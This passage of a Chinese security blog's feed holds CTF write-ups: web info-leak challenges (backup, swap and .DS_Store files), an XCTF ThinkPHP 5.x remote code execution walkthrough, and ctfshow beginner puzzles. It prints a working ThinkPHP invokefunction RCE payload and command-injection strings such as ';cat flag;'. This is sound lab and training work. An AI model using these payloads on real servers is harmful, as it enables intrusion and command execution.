    <link href="http://lingxin16.github.io/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    <id>http://lingxin16.github.io/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</id>
    <published>2020-03-10T08:47:23.000Z</published>
    <updated>2020-03-10T09:14:44.383Z</updated>
    
    <content type="html"><![CDATA[<p>题目</p><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><a id="more"></a><p>给的一些提示</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/1.png" alt="1"></p><p>在<a href="http://www.zip中找到备份文件下载" target="_blank" rel="noopener">www.zip中找到备份文件下载</a></p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310164900.jpg" alt="QQ截图20200310164900"></p><p>由于在三个文件中都没有找到flag 最后访问网站的三个目录，在/flag_716325087.txt中找到flag</p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165506.jpg" alt="QQ截图20200310165506"></p><p>打开index.php.bak下载备份文件</p><p>记事本打开得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165638.jpg" alt="QQ截图20200310165638"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><p>查看页面</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165827.jpg" alt="QQ截图20200310165827"></p><p>关于vim缓存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">以 index.php 为例：第一次产生的交换文件名为 .index.php.swp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">再次意外退出后，将会产生名为 .index.php.swo 的交换文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">第三次产生的交换文件则为 .index.php.swn</span></pre></td></tr></table></figure><p>访问.index.php.swp下载文件</p><p>打开拖到最后 得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170243.jpg" alt="QQ截图20200310170243"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>题目</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170706.jpg" alt="QQ截图20200310170706"></p><p>访问.DS_Store下载</p><p>打开发现一个txt文件(也可以使用Python-dsstore工具处理)附上下载地址：<a href="https://github.com/gehaxelt/Python-dsstore" target="_blank" rel="noopener">https://github.com/gehaxelt/Python-dsstore</a></p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170901.jpg" alt="QQ截图20200310170901"></p><p>访问这个地址(去掉空格)得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310171109.jpg" alt="QQ截图20200310171109"></p><p>关于.DS_Store</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目&lt;/p&gt;
&lt;h2 id=&quot;网站源码&quot;&gt;&lt;a href=&quot;#网站源码&quot; class=&quot;headerlink&quot; title=&quot;网站源码&quot;&gt;&lt;/a&gt;网站源码&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="ctfhub" scheme="http://lingxin16.github.io/tags/ctfhub/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="信息泄露" scheme="http://lingxin16.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-php_rce</title>
    <link href="http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/"/>
    <id>http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</id>
    <published>2020-03-09T08:05:13.000Z</published>
    <updated>2020-03-09T08:31:11.074Z</updated>
    
    <content type="html"><![CDATA[<p>第一次见thinkPHP，以前只有听过</p><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg" alt="QQ截图20200309160713"></p><a id="more"></a><p>刚看到还以为我容器坏了…其实并没有</p><p>题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1. 什么是远程代码执行漏洞</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">远程命令&#x2F;代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">2. 漏洞产生的根本原因</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</span></pre></td></tr></table></figure><p>页面也说明了是ThinkPHP V5版本  百度得知这个版本的确有远程代码执行漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</span></pre></td></tr></table></figure><p>直接上payload</p><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span></pre></td></tr></table></figure><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162510.jpg" alt="QQ截图20200309162510"></p><p>cat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span></pre></td></tr></table></figure><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162435.jpg" alt="QQ截图20200309162435"></p><p>附上一些查找到的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次见thinkPHP，以前只有听过&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg&quot; alt=&quot;QQ截图20200309160713&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="攻防世界" scheme="http://lingxin16.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
      <category term="ThinkPHP" scheme="http://lingxin16.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-萌新赛</title>
    <link href="http://lingxin16.github.io/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <id>http://lingxin16.github.io/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/</id>
    <published>2020-03-08T05:16:08.000Z</published>
    <updated>2020-03-08T08:13:34.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="萌新赛web-签到题"><a href="#萌新赛web-签到题" class="headerlink" title="萌新赛web_签到题"></a>萌新赛web_签到题</h2><p>源码：</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308132725.jpg" alt="QQ截图20200308132725"></p><a id="more"></a><p>这道题的预期解是命令执行</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?url&#x3D;;ls;</span></pre></td></tr></table></figure><p>发现flag index.php两个目录</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308133544.jpg" alt="QQ截图20200308133544"></p><p>再构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?url&#x3D;;cat flag;</span></pre></td></tr></table></figure><p>得到flag</p><p>然后我做的时候是直接访问/flag 下载flag文件得到flag</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308133922.jpg" alt="QQ截图20200308133922"></p><p>不愧是我(萌新)</p><h2 id="萌新赛密码学-签到题"><a href="#萌新赛密码学-签到题" class="headerlink" title="萌新赛密码学_签到题"></a>萌新赛密码学_签到题</h2><p>Ao(mgHX^E)AN2PSBOu3qI0o</p><p>直接base85解码得到flag</p><h2 id="萌新赛密码学-抱我"><a href="#萌新赛密码学-抱我" class="headerlink" title="萌新赛密码学_抱我"></a>萌新赛密码学_抱我</h2><p>下载flag.py</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308134323.jpg" alt="QQ截图20200308134323"></p><p>完全不懂的py脚本，就交给呆头鹅林师傅了</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/1.jpg" alt="1"></p><p>最后林师傅解出来的随机数列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">d f l 3 3 &#123; 6 &#123; 6 g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">3 a f a 6 &#123; 3 &#125; a g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123; &#125; a a g d f &#125; 6 f</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">3 6 d &#123; d f l &#123; 6 a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">6 g a f d d f g &#125; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">3 f &#125; &#125; 6 l a &#123; 3 &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">f d f 3 &#125; g l a &#125; 6</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125; l g 6 g 6 d f l f</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#123; d f g d 3 f d f g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#123; g 6 a &#125; a 3 &#123; 6 &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">f a &#123; &#125; f &#125; f &#125; &#125; &#125;</span></pre></td></tr></table></figure><p>结合群主的爱好，盲猜flag{36d}！！！</p><h2 id="萌新赛杂项-qrcode"><a href="#萌新赛杂项-qrcode" class="headerlink" title="萌新赛杂项_qrcode"></a>萌新赛杂项_qrcode</h2><p>题目下载下来打开是一段二进制，结合题目qrcode应该是二进制和二维码之间的转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111</span></pre></td></tr></table></figure><p>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">from PIL import Image</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">MAX &#x3D; 25</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(MAX, MAX))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;得到的二进制数字&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">i&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for y in range (0,MAX):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    for x in range (0,MAX):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if(str[i] &#x3D;&#x3D; &#39;1&#39;):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            pic.putpixel([x,y],(0, 0, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            pic.putpixel([x,y],(255,255,255))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        i &#x3D; i+1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">pic.show()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">pic.save(&quot;flag.png&quot;)</span></pre></td></tr></table></figure><p>得到二维码，扫描得flag</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/flag.png" alt="flag"></p><h2 id="萌新赛杂项-签到"><a href="#萌新赛杂项-签到" class="headerlink" title="萌新赛杂项_签到"></a>萌新赛杂项_签到</h2><p>查看源代码</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155004.jpg" alt="QQ截图20200308155004"></p><p>发现第十行代码意外的长</p><p>把下面下载下来用notepad打开 查看第十行</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155220.jpg" alt="QQ截图20200308155220"></p><p>把tab替换成1，空格替换成0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">00101101001011100010111000101110001011100010000000101101001011100010111000101110001011100010000000101101001011100010111000101110001011100010000000101101001011100010110100101110001000000010110100101110001011100010111000101110001000000010111000101101001011010010110100101101001000000010110100101110001011100010111000101110001000000010110100101101001011100010111000101110001000000010110100101101001011100010111000101110001000000010110100101110001011100010111000100000001011100010111000101110001011100010110100100000001011010010111000101110001000000010110100101110001011100010111000101110001000000010111000101110001011100010111000101110001000000010110100101110001011100010111000101110001000000010111000100000001011010010111000101110001011100010111000100000001011010010110100101110001011100010111000100000001011100010111000101110001011100010110100100000001011010010111000101110001000000010110100101110001011100010111000101110001000000010111000101110001011100010111000101110001000000010110100101110001011100010111000101110001000000010111000100000001011010010111000101110001011100010111000100000001011010010110100101110001011100010111000100000001011100010111000101110001011100010110100100000001011100010111000101110001011100010110100100000001011010010111000101110001011100010111000100000001011100010110100101101001011010010110100100000001011010010110100101110001011100010111000100000001011010010111000101110</span></pre></td></tr></table></figure><p>转换字符串</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155637.jpg" alt="QQ截图20200308155637"></p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-.... -.... -.... -.-. -.... .---- -.... --... --... -... ....- -.. -.... ..... -.... . -.... --... ....- -.. -.... ..... -.... . -.... --... ....- ....- -.... .---- --... -..</span></pre></td></tr></table></figure><p>摩斯解码处理</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155735.jpg" alt="QQ截图20200308155735"></p><p>得到十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">666c61677b4d656e674d656e6744617d</span></pre></td></tr></table></figure><p>最后转换ASCII码得到flag{MengMengDa}</p><h2 id="萌新赛杂项-劝退警告"><a href="#萌新赛杂项-劝退警告" class="headerlink" title="萌新赛杂项_劝退警告"></a>萌新赛杂项_劝退警告</h2><p>下载下来是一张gif，直接改后缀.zip解压发现压缩包</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308135432.jpg" alt="QQ截图20200308135432"></p><p>压缩包中两个文件flag2.zip和sudoku.png</p><p>右边的注释说明密码需要我们解数独 但是sudoku.png也显示是加密的</p><p>这里我用Ziperello来爆破发现导入压缩包的时候显示只有一个文件是加密的</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308135730.jpg" alt="QQ截图20200308135730"></p><p>那么这个sudoku.png就可能是伪加密，通过修改二进制解压出sudoku.png</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/sudoku.png" alt="sudoku"></p><p>然后在线解数独，通过注释说明的方法得到flag2.zip的密码得到flag2.zip</p><p>结果flag2.zip还有密码，而且不是伪加密，只有注释:这道题很难，你现在离开还来得及。</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308140057.jpg" alt="QQ截图20200308140057"></p><p>我可能会离开吗！必不可能啊。通过与群里的几位师傅商量，我们最终觉得这应该是明文爆破，但是怎么构造明文可就难倒大家了。</p><p>也不难发现，这个说明.txt大小只有1kb 48字节，我们通过把注释写到txt中惊奇的发现也是48字节！！！（有的师傅是36字节，原因是txt的编码方式不同，更改编码方式就行）</p><p>直接开始爆破，在爆破的过程中一半我们不用等爆破完直接停止就能得到恢复后的文件</p><p>，但是这个不能立即停止…..足足爆破了两个小时也没停</p><p>最后发现是停止的时间问题（明文爆破分两个阶段，第一个阶段我们就能得到恢复后的文件，第二阶段是寻找密码的过程。我们只需要解压后的文件，不需要密码，所以在第一阶段结束后就可以停止了，时间长的话就没有办法立即停止了。。。orz）</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308140749.jpg" alt="QQ截图20200308140749"></p><p>得到的这个flag.zip就很好爆破了，这里我是根据注释，写出了字典爆破，大家也可以用掩码爆破，得到open your eye.jpg根据文件名，猜到用silenteye来提取隐藏信息</p><p>得到flag.txt</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308141027.jpg" alt="QQ截图20200308141027"></p><p>不难发现是16进制 直接扔到winhex</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308141229.jpg" alt="QQ截图20200308141229"></p><p>猜测是pyc文件   关于pyc文件是py文件运行时产生的，我们可以通过反编译得到py文件，反编译的话有在线反编译的</p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(lambda __print, __g, __y, __operator: [ [ [ [ [ [ (check(0), None)[1] for __g[&#39;check&#39;], check.__name__ in [</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> (</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  lambda x: (lambda __l: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ __this() for __l[&#39;n&#39;] in [__operator.iadd(__l[&#39;n&#39;], decode(arr[int(__l[&#39;i&#39;])] + decode(arr[11] + chr(61) * 2) * 2))] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : [ __this() for __l[&#39;v&#39;] in [__operator.iadd(__l[&#39;v&#39;], chr(int(__l[&#39;n&#39;])))] ][0], iter(__l[&#39;c&#39;])) for __l[&#39;n&#39;] in [&#39;&#39;] ][0] for __l[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : (lambda __after: (__print(__l[&#39;v&#39;]), __after())[1] if __l[&#39;x&#39;] &#x3D;&#x3D; 1 else __after())(lambda : None), iter(flag.split(decode(arr[10] + decode(arr[11] + chr(61) * 2) * 2))))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">   for __l[&#39;v&#39;] in [&#39;&#39;] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">   for __l[&#39;x&#39;] in [x] ][0])(&#123;&#125;), &#39;check&#39;)]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">          ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;decode&#39;], decode.__name__ in [(lambda s: (lambda __l: [ base64.b64decode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])(&#123;&#125;), &#39;decode&#39;)] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;encode&#39;], encode.__name__ in [(lambda s: (lambda __l: [ base64.b64encode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])(&#123;&#125;), &#39;encode&#39;)] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;flag&#39;] in [&#39;136-139-78-132-162-89-49-117-70-161-49-118-70-02-01-01-70-137-01-160&#39;] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;arr&#39;] in [[&#39;NQ&#39;, &#39;MQ&#39;, &#39;Mw&#39;, &#39;MA&#39;, &#39;NA&#39;, &#39;Ng&#39;, &#39;Mg&#39;, &#39;OQ&#39;, &#39;Nw&#39;, &#39;OA&#39;, &#39;LQ&#39;, &#39;PQ&#39;]] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;base64&#39;] in [__import__(&#39;base64&#39;, __g, __g)] ][0])(__import__(&#39;__builtin__&#39;, level&#x3D;0).__dict__[&#39;print&#39;], globals(), lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())), __import__(&#39;operator&#39;, level&#x3D;0))</span></pre></td></tr></table></figure><p>通过hint改check(0)为check(1)运行得到flag</p><h2 id="萌新赛杂项-萌新福利"><a href="#萌新赛杂项-萌新福利" class="headerlink" title="萌新赛杂项_萌新福利"></a>萌新赛杂项_萌新福利</h2><p>解压得到show.bin文件</p><p>根据提示求反</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308160159.jpg" alt="QQ截图20200308160159"></p><p>输出音频文件，得到flag(小姐姐声音真好听……)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;萌新赛web-签到题&quot;&gt;&lt;a href=&quot;#萌新赛web-签到题&quot; class=&quot;headerlink&quot; title=&quot;萌新赛web_签到题&quot;&gt;&lt;/a&gt;萌新赛web_签到题&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308132725.jpg&quot; alt=&quot;QQ截图20200308132725&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctfshow" scheme="http://lingxin16.github.io/tags/ctfshow/"/>
    
  </entry>
  
</feed>
